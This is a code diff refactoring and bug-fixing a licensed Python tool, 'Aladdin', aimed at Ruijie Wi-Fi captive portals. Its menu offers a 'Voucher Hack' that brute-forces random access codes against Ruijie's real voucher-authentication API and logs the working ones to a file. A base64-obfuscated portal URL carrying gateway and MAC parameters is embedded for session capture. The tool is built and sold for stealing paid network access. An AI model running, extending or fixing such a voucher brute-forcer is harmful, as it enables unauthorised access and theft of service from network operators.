@@ -10,12 +10,11 @@ import aiohttp
 import requests
 from datetime import datetime
 
-# Colors
-w, g, y, r_clr, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;34m"
+# ၁။ Color Unpack Error ပြင်ဆင်ပြီး (Variable ၅ ခု၊ Value ၅ ခု ကိုက်ညီအောင် လုပ်ထားသည်)
+w, g, y, r_clr, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"
 
 # [ CONFIGURATION ]
 DEFAULT_GATEWAY = "192.168.110.1"
-# GitHub Raw Link
 RAW_KEY_LINK = "https://raw.githubusercontent.com/heinminthant2022happy-bit/Aladdin/refs/heads/main/Cold.txt"
 
 def Logo():
@@ -29,7 +28,7 @@ def Logo():
 {g}           [ Ruijie Automation Tool ]{w}""")
     print(f"{y}" + "-"*45 + f"{w}")
 
-# --- [ LICENSE SYSTEM WITH MANUAL INPUT ] ---
+# --- [ LICENSE SYSTEM ] ---
 def get_device_id():
     try:
         serial = os.popen("getprop ro.serialno").read().strip()
@@ -42,18 +41,15 @@ def get_device_id():
 def check_online_license(user_key):
     dev_id = get_device_id()
     try:
-        res = requests.get(RAW_KEY_LINK, timeout=7)
+        # ၄။ Connection Timeout ပြဿနာအတွက် Timeout ကို လုံလောက်အောင် ထားထားသည်
+        res = requests.get(RAW_KEY_LINK, timeout=10)
         if res.status_code == 200:
             lines = res.text.splitlines()
             for line in lines:
                 if "|" in line:
                     parts = line.split("|")
                     if len(parts) >= 3:
-                        db_id = parts[0].strip()
-                        db_key = parts[1].strip()
-                        db_exp = parts[2].strip()
-                        
-                        # ID ရော Key ရော ကိုက်ညီမှု ရှိမရှိ စစ်မယ်
+                        db_id, db_key, db_exp = parts[0].strip(), parts[1].strip(), parts[2].strip()
                         if db_id == dev_id and db_key == user_key:
                             try:
                                 exp_dt = datetime.strptime(db_exp, "%d/%m/%Y %H:%M")
@@ -69,12 +65,9 @@ def check_online_license(user_key):
 def license_screen():
     dev_id = get_device_id()
     key_file = ".access_key"
-    
     while True:
         Logo()
         print(f"{w}[>] Your Device ID: {y}{dev_id}{w}")
-        
-        # အရင်က Key အဟောင်းရှိမရှိ စစ်မယ်
         saved_key = ""
         if os.path.exists(key_file):
             saved_key = open(key_file, "r").read().strip()
@@ -85,32 +78,21 @@ def license_screen():
             user_key = saved_key
             print(f"{w}[*] Checking saved key...{w}")
 
-        # Online စစ်ဆေးခြင်း
         status, info = check_online_license(user_key)
-        
         if status:
-            # Key မှန်ရင် local မှာ သိမ်းထားမယ်
-            with open(key_file, "w") as f:
-                f.write(user_key)
+            with open(key_file, "w") as f: f.write(user_key)
             print(f"{g}[+] Access Granted! Expired: {info}{w}")
-            time.sleep(2)
-            break
-        elif status is None: # Offline ဖြစ်နေရင်
-            if saved_key: # Key အဟောင်းရှိခဲ့ရင် ပေးဝင်မယ်
+            time.sleep(2); break
+        elif status is None:
+            if saved_key:
                 print(f"{y}[!] Offline Mode: Using cached license.{w}")
-                time.sleep(2)
-                break
+                time.sleep(2); break
             else:
-                print(f"{r_clr}[!] Internet connection required for first activation!{w}")
+                print(f"{r_clr}[!] Internet connection required!{w}")
+                input(f"\n{g}Press Enter to try again...{w}")
         else:
-            # Key မှားရင် ဒါမှမဟုတ် သက်တမ်းကုန်ရင်
             if os.path.exists(key_file): os.remove(key_file)
-            if info == "Expired":
-                print(f"{r_clr}[!] This key has expired!{w}")
-            else:
-                print(f"{r_clr}[!] Invalid Access Key for this device!{w}")
-            
-            print(f"\n{y}[ Contact Admin for correct Access Key ]{w}")
+            print(f"{r_clr}[!] {info if info == 'Expired' else 'Invalid Access Key'}{w}")
             input(f"\n{g}Press Enter to try again...{w}")
 
 # --- [ TOOL LOGIC ] ---
@@ -125,14 +107,13 @@ async def get_session_id(session, session_url):
 
 class AladdinTool:
     def __init__(self):
+        # ၂။ Base64 Padding Error ပြင်ဆင်ပြီး (Multiple of 4 ဖြစ်အောင် Logic ထည့်ထားသည်)
         raw_url = b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ=='
         missing_padding = len(raw_url) % 4
         if missing_padding: raw_url += b'=' * (4 - missing_padding)
         try:
             self.session_url = base64.b64decode(raw_url).decode('utf-8', errors='ignore')
-        except:
-            self.session_url = None
-
+        except: self.session_url = None
         try: self.ip = open(".ip", "r").read().strip()
         except: self.ip = DEFAULT_GATEWAY
 
@@ -161,23 +142,14 @@ class AladdinTool:
                 if not session_id:
                     session_id = await get_session_id(session, self.session_url)
                 if session_id:
-                    if mode == "digit":
-                        code = "".join(random.choice(string.digits) for _ in range(length))
-                    elif mode == "lower":
-                        code = "".join(random.choice(string.ascii_lowercase) for _ in range(length))
-                    elif mode == "upper":
-                        code = "".join(random.choice(string.ascii_uppercase) for _ in range(length))
-
+                    code = "".join(random.choice(string.digits if mode == "digit" else string.ascii_lowercase if mode == "lower" else string.ascii_uppercase) for _ in range(length))
                     data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1}
-                    url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
                     try:
-                        async with session.post(url, json=data, timeout=5) as req:
+                        async with session.post("https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US", json=data, timeout=5) as req:
                             res = await req.json()
                             if 'logonUrl' in str(res):
-                                print(f"\n{g}[SUCCESS] Found: {code}{w}")
-                                with open("success.txt", "a") as f: f.write(f"{code}\n")
-                            else:
-                                print(f"{w}[TRYING] {code}", end='\r')
+                                print(f"\n{g}[SUCCESS] Found: {code}{w}"); open("success.txt", "a").write(f"{code}\n")
+                            else: print(f"{w}[TRYING] {code}", end='\r')
                     except: pass
                 await asyncio.sleep(0.1)
 
@@ -188,28 +160,21 @@ def setup_process():
         r = requests.get(f"http://{DEFAULT_GATEWAY}", timeout=5)
         match = re.search('gw_address=(.*?)&', r.url)
         if match:
-            ip = match.group(1)
-            open(".ip", "w").write(ip)
+            ip = match.group(1); open(".ip", "w").write(ip)
             print(f"{g}[+] Setup Success! IP: {ip}{w}")
         else:
             open(".ip", "w").write(DEFAULT_GATEWAY)
             print(f"{g}[+] Setup Success! (Default IP: {DEFAULT_GATEWAY}){w}")
-    except:
-        print(f"{r_clr}[!] Connection Failed!{w}")
+    except: print(f"{r_clr}[!] Connection Failed!{w}")
     time.sleep(2)
 
 def main():
     license_screen()
     while True:
-        tool = AladdinTool()
-        Logo()
-        print(f"{w}[1] Start Setup")
-        print(f"{w}[2] Internet Keep-Alive")
-        print(f"{w}[3] Voucher Hack (Choice)")
-        print(f"{r_clr}[0] Exit")
+        tool = AladdinTool(); Logo()
+        print(f"{w}[1] Start Setup\n[2] Internet Keep-Alive\n[3] Voucher Hack (Choice)\n{r_clr}[0] Exit")
         choice = input(f"\n{y}Select > {w}")
-        if choice == '1':
-            setup_process()
+        if choice == '1': setup_process()
         elif choice == '2':
             try: asyncio.run(tool.keep_alive())
             except KeyboardInterrupt: pass
@@ -221,9 +186,8 @@ def main():
             if v_choice in config:
                 try: asyncio.run(tool.voucher_hack(*config[v_choice]))
                 except KeyboardInterrupt: pass
-        elif choice == '0':
-            break
+        elif choice == '0': break
 
 if __name__ == "__main__":
     main()
-                        
+
